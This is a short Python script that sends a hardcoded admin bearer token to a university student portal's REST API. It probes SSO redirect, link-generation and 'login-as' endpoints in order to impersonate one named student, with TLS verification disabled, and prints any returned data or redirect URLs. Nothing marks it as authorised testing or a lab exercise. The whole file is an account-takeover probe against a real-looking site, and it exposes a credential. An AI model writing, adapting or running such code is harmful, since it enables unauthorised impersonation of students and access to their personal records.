import httpx
import asyncio
import json

ADMIN_TOKEN = "LXjqwQE0Xemgq3E7LeB0tn2yMQWY0zXW"
BASE_URL = "https://student.jmcu.uz/rest/v1"
STUDENT_ID = 8300 # OshiqAli

async def probe():
    headers = {"Authorization": f"Bearer {ADMIN_TOKEN}"}
    client = httpx.AsyncClient(verify=False, headers=headers, timeout=30.0, follow_redirects=False)
    
    print(f"[-] Probing SSO Impersonation for ID {STUDENT_ID}...")
    
    endpoints = [
        f"/sso/get-redirect-url?student_id={STUDENT_ID}",
        f"/sso/get-redirect-url?id={STUDENT_ID}",
        f"/sso/targets",
        f"/sso/generate-link?student_id={STUDENT_ID}",
        f"/account/login-as?student_id={STUDENT_ID}"
    ]

    for ep in endpoints:
        try:
            url = f"{BASE_URL}{ep}"
            print(f"    Requesting {url}...")
            r = await client.get(url)
            print(f"    Status: {r.status_code}")
            if r.status_code == 200:
                print(f"    DATA: {r.json()}")
            elif r.status_code in [301, 302, 307]:
                print(f"    REDIRECT: {r.headers.get('location')}")
        except Exception as e:
            print(f"    [!] Error: {e}")

    await client.aclose()

if __name__ == "__main__":
    asyncio.run(probe())
